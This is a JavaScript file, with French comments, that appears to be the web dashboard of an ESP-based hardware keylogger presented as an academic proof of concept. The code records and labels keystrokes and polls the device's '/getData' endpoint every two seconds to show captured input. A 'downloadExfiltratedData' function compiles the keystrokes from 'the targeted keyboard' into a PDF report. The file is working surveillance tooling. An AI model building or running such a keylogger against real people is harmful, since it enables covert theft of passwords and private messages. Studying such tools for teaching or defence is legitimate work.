//pour fonctionner avec esp remettre le code ci dessous
/*let log = "";


setInterval(function ()
{
    var xhttp = new XMLHttpRequest();

    xhttp.onreadystatechange = function()
    {
        if(this.readyState == 4 && this.status == 200)
        {
          document.getElementById("log").innerHTML = "";  
          document.getElementById("log").innerHTML = this.responseText;
        }
    };

    xhttp.open("GET", "/getData", true);
    xhttp.send();
}, 2000);
*/
let log = "";


document.addEventListener("keydown", function(event) {
  if (event.key === "Enter" || event.key === "\n") {
    const timestamp = new Date().toLocaleTimeString(); // Get the current timestamp
    log += "<br>" + timestamp + "<br>"; // Append the timestamp with line breaks
  } else if (event.key === " ") {
    log += " "; // Append a forward slash
  } 
    else if (event.key === "Backspace"){
      log +="<span style='color: red;'> Backspace </span>";
    }
    else if (event.key === "Shift"){
      log +="<span style='color: red;'> Shift </span>";
    }
    else if (event.key === "Alt"){
      log +="<span style='color: red;'> Alt </span>";
    }
    else if (event.key === "Tab"){
      log +="<span style='color: red;'> Tab </span>";
    }
    else if (event.key === "OS"){
      log +="<span style='color: red;'> OS </span>";
    }
    else if (event.key === "AltGraph"){
      log +="<span style='color: red;'> ALT-GR </span>";
    }
    else if (event.key === "Control"){
      log +="<span style='color: red;'> CTRL </span>";
    }
    else if (event.key === "CapsLock"){
      log +="<span style='color: red;'> CapLock </span>";
    }
    else if (event.key === "Escape"){
      log +="<span style='color: red;'> Escape </span>";
    }
  else {
    log += event.key; // Append the actual key
  }
  document.getElementById("log").innerHTML = log; // Update the log element with the updated log variable
});

setInterval(function() {
  var xhttp = new XMLHttpRequest();

  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("log").innerHTML = "";
      document.getElementById("log").innerHTML = this.responseText;
    }
  };

  xhttp.open("GET", "/getData", true);
  xhttp.send();
}, 2000);

function downloadExfiltratedData() {
  const { jsPDF } = window.jspdf;
  let doc = new jsPDF();

  doc.addImage("./keylogger.png", "PNG", 5, 5, 20, 20);

  let title = "Keylogs report"
  let titleX = (doc.internal.pageSize.getWidth() - doc.getTextWidth(title))/2;
  doc.setFont("helvetica", "bold");
  doc.text(title, titleX, '20');


  let header = "This report contains all the keylogs typed by the targeted keyboard, including line returns when backspaces are typed"
  let splitHeader = doc.splitTextToSize(header, 180);
  let headerX = (doc.internal.pageSize.getWidth() - doc.getTextWidth(splitHeader[0]))/2;
  doc.setFont("courier", "normal");
  doc.setFontSize(12);
  doc.text(splitHeader, headerX, '30');

  let fairUse = "This projet is an academic project and is intended to be used as a Proof Of Concept. By downloading this report, you agree to use the keylogger only for educational purposes, and not in a way that could harm anyone in any extent."
  let splitFairUse = doc.splitTextToSize(fairUse, 180);
  let fairUseX = (doc.internal.pageSize.getWidth() - doc.getTextWidth(splitFairUse[0]))/2;
  doc.text(splitFairUse, fairUseX, '45');

  doc.html(document.getElementById('log'), {
    callback: function(doc) {
      doc.save("report.pdf");
    },
    html2canvas: {
      scale: 0.2
    },
    x: 40,
    y: 60
  })
}